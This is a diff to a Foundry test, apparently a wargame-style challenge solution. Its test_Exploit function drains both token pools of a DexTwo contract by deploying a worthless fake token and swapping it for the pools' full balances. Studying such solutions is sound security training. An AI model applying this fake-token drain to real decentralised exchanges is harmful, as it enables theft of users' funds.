@@ -9,15 +9,25 @@ import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 contract DexTwoTest is Test {
     SwappableTokenTwo public swappabletoken1;
     SwappableTokenTwo public swappabletoken2;
-    
+
     DexTwo public dexTwo;
     address attacker = makeAddr("attacker");
 
     function setUp() public {
         dexTwo = new DexTwo();
-        swappabletoken1 = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
+        swappabletoken1 = new SwappableTokenTwo(
+            address(dexTwo),
+            "Swap",
+            "SW",
+            110
+        );
         vm.label(address(swappabletoken1), "Token 1");
-        swappabletoken2 = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
+        swappabletoken2 = new SwappableTokenTwo(
+            address(dexTwo),
+            "Swap",
+            "SW",
+            110
+        );
         vm.label(address(swappabletoken2), "Token 2");
         dexTwo.setTokens(address(swappabletoken1), address(swappabletoken2));
 
@@ -34,15 +44,33 @@ contract DexTwoTest is Test {
     }
 
     function test_Exploit() public {
-       //Execute the attacker here.
+        //Execute the attacker here.
+        vm.startPrank(attacker);
+        SwappableTokenTwo fakeToken = new SwappableTokenTwo(
+            address(dexTwo),
+            "Swap",
+            "SW",
+            200 ether
+        );
+        fakeToken.approve(address(dexTwo), 100 ether);
+        fakeToken.transfer(address(dexTwo), 100 ether);
+        dexTwo.swap(
+            address(fakeToken),
+            address(swappabletoken1),
+            swappabletoken1.balanceOf(address(dexTwo))
+        );
+        dexTwo.swap(
+            address(fakeToken),
+            address(swappabletoken2),
+            swappabletoken2.balanceOf(address(dexTwo))
+        );
 
+        vm.stopPrank();
         is_Drained();
     }
 
-    function is_Drained () internal view{
+    function is_Drained() internal view {
         require(swappabletoken1.balanceOf(address(dexTwo)) == 0);
         require(swappabletoken2.balanceOf(address(dexTwo)) == 0);
     }
-
 }
-
